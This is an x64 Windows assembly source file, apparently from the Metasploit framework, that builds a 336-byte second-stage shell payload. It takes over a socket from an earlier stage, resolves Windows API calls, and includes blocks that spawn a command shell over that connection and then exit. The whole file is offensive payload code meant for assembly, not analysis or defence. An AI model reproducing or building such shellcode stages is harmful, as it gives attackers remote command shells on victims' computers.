;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2003
; Architecture: x64
; Size: 336 bytes
; Build: >build.py stage_shell
;-----------------------------------------------------------------------------;
[BITS 64]
[ORG 0]

; By here RDI will be our socket and RBP will be the address of 'api_call' from stage 1.
; We reset RBP to the address of 'api_call' as found in this blob to avoid any problems
; if the old stage 1 location gets munged.

  cld                    ; Clear the direction flag.
  and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "./src/block/block_api.asm"
start:                   ;
  pop rbp                ; Pop off the address of 'api_call' for calling later.
%include "./src/block/block_shell.asm"
  ; Perform the call to our EXITFUNC.
%include "./src/block/block_exitfunk.asm"